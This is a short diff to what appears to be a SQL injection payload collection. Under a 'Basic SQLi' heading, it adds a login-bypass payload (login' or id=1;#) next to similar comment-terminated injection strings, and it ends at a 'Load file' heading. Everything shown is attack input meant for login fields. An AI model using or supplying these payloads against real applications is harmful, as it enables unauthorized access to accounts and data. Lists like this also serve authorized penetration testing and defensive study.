@@ -1,5 +1,6 @@
 # Basic SQLi
 login' or 1012=1024;#
+login' or id=1;#
 login' or 1012=1024 limit 1;#
 
 #Load file:
